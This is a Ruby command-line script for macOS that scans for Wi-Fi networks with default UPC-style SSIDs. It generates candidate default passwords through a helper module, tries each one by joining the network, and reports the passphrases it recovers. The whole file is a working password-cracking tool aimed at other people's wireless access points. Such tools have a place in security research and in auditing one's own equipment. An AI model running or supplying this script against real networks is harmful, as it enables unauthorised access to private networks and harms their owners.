#!/usr/bin/env ruby

require 'optparse'
require_relative 'upc_keys.rb'

def scan
  ssids = `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan | awk '{ print $1; }' 2> /dev/null`.split("\n")
  ssids.select{ |i| i[/^UPC\d{7}$/] }
end

def try_password interface, ssid, password
  if `networksetup -setairportnetwork #{interface} "#{ssid}" "#{password}"`.empty?
    sleep(5)
    return true if `/sbin/ifconfig #{interface} | grep "inet " | cut -d " " -f2`
  end
  false
end

def cleanup interface, ssid
  `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z`
  `networksetup -removepreferredwirelessnetwork #{interface} #{ssid}`
end

def crack interface, ssid
  passwords = predict_passwords ssid
  puts "#{passwords.size} possible keys found for #{ssid}"
  print '  Trying keys'
  passwords.each do |password|
    print '.'
    return password if try_password interface, ssid, password
  end
  nil
end

if $0 == __FILE__
  interface = ''
  ssids = []
  OptionParser.new do |opts|
    opts.banner = 'Usage: script.rb [options]'
    opts.on('-i', '--interface=INTERFACE', String, 'The interface on which to operate') { |v| interface = v }
    opts.on('-s', '--ssid=SSID', String, 'The SSID of the vulnerable UPC access point') { |v| ssids.push v }
  end.parse!
  raise OptionParser::MissingArgument, '--interface' if interface.empty?


  if ssids.empty?
    puts 'Searching for vulnerable accesspoints.'
    ssids = scan
    puts "#{ssids.size} vulnerable accesspoint(s) found."
  end

  result = {}
  ssids.each do |ssid|
    password = crack interface, ssid
    puts ''
    if password
      result[ssid] = password
      puts "  Password: #{password}"
    end
    cleanup interface, ssid
  end

 puts 'Recovered passphrases:'
  result.each do |ssid, password|
    puts "  #{ssid}: #{password}"
  end
end
